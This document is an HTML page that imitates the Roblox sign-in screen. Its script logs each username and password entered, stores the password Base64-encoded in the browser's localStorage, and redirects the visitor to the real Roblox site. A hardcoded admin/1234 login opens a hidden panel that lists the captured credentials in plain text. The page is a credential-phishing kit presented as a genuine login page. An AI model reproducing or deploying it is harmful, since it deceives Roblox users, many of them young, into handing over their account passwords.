<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Sign In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #222;
            color: white;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .navbar {
            width: 100%;
            background-color: #333;
            padding: 10px 0;
            text-align: center;
            position: fixed;
            top: 0;
        }
        .navbar img {
            height: 40px;
        }
        .container {
            background-color: #333;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
            margin-top: 80px; /* To offset for the navbar */
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
            background-color: #444;
            color: white;
        }
        .sign-in-btn {
            background-color: #ff0000;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .sign-in-btn:hover {
            background-color: #e60000;
        }
        .link-btn {
            margin-top: 10px;
            color: #0073e6;
            cursor: pointer;
            text-decoration: underline;
            display: block;
            background: none;
            border: none;
            padding: 0;
            font: inherit;
        }
        .link-btn:hover {
            color: #005bb5;
        }
        .admin-container {
            background-color: #333;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            display: none;
            color: white;
            margin-top: 80px; /* To offset for the navbar */
            overflow-y: auto;
            max-height: calc(100vh - 120px);
        }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .search-bar {
            margin-bottom: 15px;
            width: calc(100% - 40px); /* Adjust width to be responsive */
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
            background-color: #444;
            color: white;
        }
        .log-list {
            text-align: left;
            margin-top: 20px;
            word-wrap: break-word;
        }
        .log-item {
            margin-bottom: 10px;
        }
        .log-item div {
            margin-bottom: 5px;
        }
        button {
            background-color: #ff0000;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #e60000;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/0/e/e/0eeeb19633422b1241f4306419a0f15f39d58de9.png" alt="Roblox Logo">
    </div>
    <div class="container" id="login-container">
        <h2>Login to Roblox</h2>
        <form onsubmit="handleLogin(event)">
            <div class="input-group">
                <label for="username">Username/Email/Phone</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="sign-in-btn">Log In</button>
        </form>
        <button class="link-btn" onclick="window.location.href='https://www.roblox.com/login/forgot-password-or-username'">Forgot Password or Username?</button>
        <button class="link-btn" onclick="window.location.href='https://www.roblox.com/CreateAccount'">Don't have an account? Sign Up</button>
    </div>
    <div class="admin-container" id="admin-container">
        <h2>Admin Panel</h2>
        <input type="text" id="search-bar" class="search-bar" placeholder="Search logs..." onkeyup="searchLogs()">
        <button onclick="clearLogs()">Clear Logs</button>
        <div class="log-list" id="log-list"></div>
        <button onclick="logout()">Logout</button>
    </div>
    <script>
        const ADMIN_USERNAME = 'admin';
        const ADMIN_PASSWORD = '1234';

        function handleLogin(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Log the login attempt with timestamp
            logLogin(username, password);

            if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
                showAdminPanel();
            } else {
                window.location.href = 'https://www.roblox.com';
            }
        }

        function logLogin(username, password) {
            const logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
            const timestamp = new Date().toLocaleString('en-US', { timeZone: 'America/New_York', hour12: false });
            const formattedTimestamp = formatDate(new Date(timestamp));
            const newLog = { username, password: btoa(password), timestamp: formattedTimestamp }; // Obfuscate password with Base64 encoding
            logs.push(newLog);
            localStorage.setItem('loginLogs', JSON.stringify(logs));
        }

        function formatDate(date) {
            const month = String(date.getMonth() + 1).padStart(2, '0');
            const day = String(date.getDate()).padStart(2, '0');
            const year = date.getFullYear();
            const hours = String(date.getHours()).padStart(2, '0');
            const minutes = String(date.getMinutes()).padStart(2, '0');
            const seconds = String(date.getSeconds()).padStart(2, '0');
            return `${month}/${day}/${year}, ${hours}:${minutes}:${seconds}`;
        }

        function showAdminPanel() {
            document.getElementById('login-container').style.display = 'none';
            const adminContainer = document.getElementById('admin-container');
            adminContainer.style.display = 'block';
            displayLogs();
        }

        function displayLogs() {
            const logList = document.getElementById('log-list');
            const logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
            logList.innerHTML = logs.map(log => `
                <div class="log-item">
                    <div>[${log.timestamp}]</div>
                    <div>Username: ${log.username}</div>
                    <div>Password: ${atob(log.password)}</div>
                </div>`).join('');
        }

        function clearLogs() {
            localStorage.removeItem('loginLogs');
            displayLogs();
        }

        function logout() {
            document.getElementById('login-container').style.display = 'block';
            document.getElementById('admin-container').style.display = 'none';
        }

        function searchLogs() {
            const query = document.getElementById('search-bar').value.toLowerCase();
            const logList = document.getElementById('log-list');
            const logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
            const filteredLogs = logs.filter(log => 
                log.username.toLowerCase().includes(query) ||
                atob(log.password).toLowerCase().includes(query) ||
                log.timestamp.toLowerCase().includes(query)
            );
            logList.innerHTML = filteredLogs.map(log => `
                <div class="log-item">
                    <div>[${log.timestamp}]</div>
                    <div>Username: ${log.username}</div>
                    <div>Password: ${atob(log.password)}</div>
                </div>`).join('');
        }
    </script>
</body>
</html>
